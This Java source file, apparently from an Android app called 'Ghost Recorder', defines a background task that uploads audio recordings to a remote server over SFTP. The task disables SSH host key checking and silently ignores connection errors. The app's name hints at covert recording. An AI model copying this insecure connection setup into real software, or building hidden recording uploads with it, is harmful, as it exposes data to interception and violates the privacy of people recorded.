package com.byteshaft.ghostrecorder;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.KeyPair;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.net.SocketException;

public class UploadRecordingTask extends AsyncTask<String, Void, String> {

    private final String LOGTAG = AppGlobals.LOG_TAG + "/" + getClass().getName();

    private Session mSession;
    private Channel mChannel;
    private ChannelSftp mChannelSftp;
    private Context mContext;
    private Helpers mHelpers;
    private String mFileName;
    private boolean UPLOAD_INTERRUPTED;

    public UploadRecordingTask(Context context) {
        super();
        mContext = context;
        mHelpers = new Helpers(context.getApplicationContext());
    }

    protected String doInBackground(String... params) {
        String SFTP_HOST = mContext.getString(R.string.sftp_host);
        String SFTP_PORT = mContext.getString(R.string.sftp_port);
        String SFTP_USER = mContext.getString(R.string.sftp_username);
        String SFTP_PASSWORD = mContext.getString(R.string.sftp_password);
        String SFTP_WORKING_DIR = mContext.getString(R.string.sftp_working_directory);
        Log.i("Ghost_Recorder", "preparing the host information for sftp.");

        try {
            /*using jsch library for sending Recording to server*/
            connectToServer(SFTP_HOST, SFTP_PORT, SFTP_USER, SFTP_PASSWORD, SFTP_WORKING_DIR);
            File file = new File(params[0]);
            mFileName = file.getName();
            Log.i(LOGTAG, "file Transfer started...");
            mChannelSftp.put(new FileInputStream(file), file.getName());
            Log.i(LOGTAG, "File transfered successfully to host.");

        } catch (SftpException e) {
            UPLOAD_INTERRUPTED = true;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onPostExecute(String aString) {
        super.onPostExecute(aString);
        if (UPLOAD_INTERRUPTED) {
            Log.i(LOGTAG, "file upload intruptted");
            String notUploadedFile = mHelpers.path + mFileName;
            System.out.println(notUploadedFile);
            RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper(mContext);
            recordingHelper.openDatabase();
            recordingHelper.createNewEntry(SqliteHelper.COULMN_DELETE, notUploadedFile);
            recordingHelper.createNewEntry(SqliteHelper.COULMN_UPLOAD, notUploadedFile);
        }
    }

    private void connectToServer(String host, String port, String userName,
                                 String password, String workingDirectory) {
        JSch jsch = new JSch();
        try {
            mSession = jsch.getSession(userName, host, Integer.valueOf(port));
            mSession.setPassword(password);
            java.util.Properties config = new java.util.Properties();
            config.put("StrictHostKeyChecking", "no");
            mSession.setConfig(config);
            mSession.connect();
            Log.i("Ghost_Recorder", "Host connected.");
            mChannel = mSession.openChannel("sftp");
            mChannel.connect();
            Log.i("Ghost_Recorder", "sftp channel opened and connected.");
            mChannelSftp = (ChannelSftp) mChannel;
            mChannelSftp.cd(workingDirectory);
        } catch (JSchException ignore) {

        } catch (SftpException e) {
            e.printStackTrace();
        }
    }

    private void stopUploadingWhenFinished() {
        mChannelSftp.exit();
        Log.i("Server", "sftp Channel exited.");
        mChannel.disconnect();
        Log.i("Server", "Channel disconnected.");
        mSession.disconnect();
        Log.i("Server", "Host Session disconnected.");
    }
}

